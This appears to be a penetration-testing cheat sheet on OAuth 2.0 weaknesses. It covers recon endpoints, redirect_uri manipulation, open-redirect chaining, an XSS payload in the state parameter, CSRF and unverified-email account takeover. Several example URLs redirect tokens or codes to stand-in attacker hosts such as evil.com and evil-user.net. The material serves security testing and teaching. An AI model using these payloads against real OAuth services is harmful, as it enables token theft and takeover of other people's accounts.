# OAuth_testing

## OAuth authentication is generally implemented as follows

- The user chooses the option to log in with their social media account. The client application then uses the social media site's OAuth service to request access to some data that it can use to identify the user. This could be the email address that is registered with their account, for example. 
- After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint. 
- Once it has received the data, the client application uses it in place of a username to log the user in. The access token that it received from the authorization server is often used instead of a traditional password. 

## Common OAuth attacks
- Unvalidated redirect_uri Parameter
- Weak Authorization tokens ( an attacker may be able to guess it or bruteforce it)
- Everlasting Authorization tokens
- Authorization tokens not bound to a client

## Recon 

You should always try sending a GET request to the following standard endpoints:

- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`


## Grabbing OAuth Token via redirect_uri

Redirect to a controlled domain to get the access token

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

Redirect to an accepted Open URL in to get the access token

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.

Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```
You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows:
```powershell
https://www.example.com/authorize?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net 
```
Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net.`

Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the redirect_uri. However, that doesn't mean it's time to give up. Try to find ways that you can successfully access different subdomains or paths.

Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token, like an Open URL Redirect.

`https://www.example.com/vulnerable-page/?path=`
```powershell
https://www.example.com/authorize?[...]&redirect_uri=vulnerable-page/?path=evil-user.net
```

## Executing XSS via redirect_uri

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## Unverified user registration

When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.

Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider. 

## Authorization Code Rule Violation

> The client MUST NOT use the authorization code  more than once.  
If an authorization code is used more than once, the authorization server MUST deny the request 
and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.

## Cross-Site Request Forgery
> If you notice that the authorization request does not send a state parameter, this is extremely interesting from an attacker's perspective. It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack. This can have severe consequences depending on how OAuth is being used by the client application. 

Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL can be used in CSRF attacks.


## References

* [Portswigger - OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
* [PayloadALLthethings - OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)
